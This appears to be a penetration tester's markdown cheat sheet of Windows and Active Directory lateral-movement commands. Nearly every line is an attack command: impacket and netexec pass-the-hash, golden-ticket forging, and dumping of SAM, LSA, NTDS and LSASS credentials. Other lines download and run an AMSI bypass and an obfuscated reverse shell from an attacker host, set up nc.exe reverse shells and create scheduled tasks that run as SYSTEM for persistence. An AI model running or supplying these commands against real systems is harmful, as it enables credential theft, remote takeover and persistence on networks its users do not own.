### Netowrk Lateral Movement

```
impacket-wmiexec Administrator:P@ssw0rd@192.168.10.131
impacket-wmiexec adminWebSvc:'FGjksdff89sdfj'@192.168.215.181
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122
impacket-psexec Administrator:P@ssw0rd@192.168.10.131
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122 
```

### With Domain
```
/usr/bin/impacket-ticketer -domain activebreach.io -domain-sid <> -nthash <> Administrator
export KRB5CCNAME=Administrator.ccache
/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-psexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-smbexec  -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
```

### Crackmapexec 
```
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --sam
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth --ntds
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M laps
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M ntdsutil
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --ntds vss
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --spider C\$ --pattern txt 
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd -x "type C:\Windows\System32\Tasks\HackMe.txt"
```

### Miscellaneous
```
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ping 192.168.100.100”
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/amsibypass.txt')”
wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/Obfuscated_RevShell.ps1')”
invoke-command -computername john.activebreach.io -scriptblock {schtasks /create /SC minute /mo 1 /RU "NT Authority\SYSTEM" /TN "Persist" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/Obfuscated_RevShell.ps1''')'"}

```

### NetExec
```
netexec  smb 192.168.1.0/24
netexec winrm authority.htb -u svc_pwm -p 'pWm_@dm!N_!23'
netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoam
netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
netexec smb serveur.whiteflag.local -u Administrateur -p Defte@WF -M lsassy

nxc smb 10.10.10.10 -u administrator -p 123456789aA --sam --amsi-bypass FILE
nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> -x <COMMAND>
nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> -X <PS_COMMAND>
nxc smb <target> -u <USERNAME> -p <PASSWORD> -M rdp
nxc mssql <target> -u <USERNAME> -p <PASSWORD> --local-auth -x whoami
nxc ldap  10.10.10.10 -u administrator -p 123456789aA --bloodhound --collection All
nxc ldap  10.10.10.10 -u administrator -p 123456789aA --password-not-required --groups --users --trusted-for-delegation 
nxc <mssql|smb> <target> -u <USERNAME> -p <PASSWORD> --local-auth -M met_inject -o LHOST=<attack-machine> LPORT=<listening-port>
```
### Windows Management Instrumentation
```
Get-WmiObject -Query "select * from win32_service where name='WinRM'" -ComputerName 192.168.100.10, 192.168.100.20 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -ep bypass'
Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘insomnia.io\Spider01
wmic /node:"web01" /user:"insomnia.io\Spider01" /password:"Spider01@" process call create "powershell -enc [...snip...]"

```

### Schedule
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'
schtasks /create /S web01.insomnia.io /SC Weekly /RU "NT Authority\SYSTEM" /TN "Give_Me" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:9090/1.ps1''')'"
```

### PowerShell Remoting
```


PowerShell Invoke-Command -ComputerName Web01 -ScriptBlock { hostname; whoami }
PowerShell $pass=ConvertTo-SecureString "Spider01@" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("insomnia.io\wob01", $pass)
Invoke-Command -ComputerNameweb01 -ScriptBlock { hostname; whoami } -Credential $cred

Get-PSSession
Enter-PsSession -id 1

Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.100.100 7777 -e cmd.exe}
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerView.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\rubeus.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-Mimikatz.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
```
